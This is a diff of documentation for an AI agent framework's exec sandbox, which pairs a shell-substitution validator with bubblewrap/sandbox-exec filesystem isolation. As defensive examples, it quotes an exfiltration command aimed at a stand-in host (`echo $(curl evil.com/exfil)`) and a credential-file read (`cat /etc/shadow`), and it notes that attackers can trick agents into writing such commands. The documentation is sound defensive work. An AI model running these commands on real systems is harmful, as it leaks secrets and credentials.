@@ -1,10 +1,57 @@
 ---
 title: "Exec Sandbox"
-description: "OS-level filesystem isolation for the exec tool using bubblewrap (Linux) and sandbox-exec (macOS)"
+description: "OS-level filesystem isolation for the system.exec tool using bubblewrap (Linux) and sandbox-exec (macOS)"
 icon: "box"
 ---
 
-File tools like `read`, `write`, and `edit` are protected by [Safe Path](/reference/safe-path) validation -- every path parameter is checked before the operation proceeds. But the `exec` tool spawns a full shell that can access any file on the host filesystem. The exec sandbox closes this gap with kernel-enforced filesystem isolation, ensuring that shell commands run inside a restricted namespace where only approved paths are visible.
+File tools like `read`, `write`, and `edit` are protected by [Safe Path](/reference/safe-path) validation -- every path parameter is checked before the operation proceeds. But the `system.exec` tool spawns a full shell that can access any file on the host filesystem. The exec sandbox closes this gap with kernel-enforced filesystem isolation, ensuring that shell commands run inside a restricted namespace where only approved paths are visible.
+
+<Warning>
+**Scope is critical.** The exec sandbox protects **only the `system.exec`
+tool**. It does not sandbox:
+
+- **In-process Node tools** -- built-in skills that run inside the daemon
+  process (file_read, web_fetch, memory_search, etc.) execute with full
+  daemon permissions. Their security relies on application-level layers
+  (safePath, SSRF guard, tool policy, content scanner).
+- **MCP stdio servers** -- external MCP processes are explicitly launched
+  with `NODE_OPTIONS` stripped (see
+  [Node Permissions](/reference/node-permissions)) so MCP servers run
+  unsandboxed by design. Treat each MCP server as a trusted dependency.
+- **Arbitrary agent code** -- if you give an agent Python, Node, or other
+  language tooling outside `system.exec`, that code runs unsandboxed.
+
+The single guarantee here is: when the `system.exec` tool is invoked, the
+shell process it spawns sees only approved paths.
+</Warning>
+
+## Two-Stage Protection: Validator + Sandbox
+
+Every `system.exec` call passes through **two layers** before the OS spawns
+the shell:
+
+1. **`ExecSecurityValidator`** (pre-sandbox) -- a quote-aware state machine
+   inspects the command string for dangerous shell substitution and rejects
+   it before the sandbox even runs. Caught patterns include:
+   - Command substitution: `$(...)`
+   - Backtick substitution: `` `...` ``
+   - Process substitution: `<(...)`, `>(...)`
+   - Zsh process substitution: `=(...)`
+   - Zsh equals expansion: `=cmd` at a word boundary
+
+   The validator tracks quote context (normal, single, double, backtick) so
+   patterns inside single quotes (where the shell does not interpret them)
+   pass through unchanged.
+
+2. **OS-level sandbox** (filesystem isolation) -- if the validator approves,
+   the command is wrapped by bubblewrap or sandbox-exec for the actual
+   spawn.
+
+This means an attacker who tricks an agent into writing
+`echo $(curl evil.com/exfil)` is stopped at stage 1, before the sandbox
+runs. The sandbox catches anything stage 1 misses (e.g.,
+`cat /etc/shadow` -- syntactically clean, but `/etc/shadow` is invisible
+inside the namespace).
 
 ## The Problem
 
@@ -110,7 +157,7 @@ When an agent runs inside an [execution graph](/agents/execution-graphs) pipelin
 
 <CardGroup cols={2}>
   <Card title="Defense in Depth" icon="shield-halved" href="/security/defense-in-depth">
-    How the exec sandbox fits into the 18 security layers
+    How the exec sandbox fits into the 22 categorical security layers
   </Card>
   <Card title="Safe Path" icon="folder-closed" href="/reference/safe-path">
     Path validation for file tools (read, write, edit)
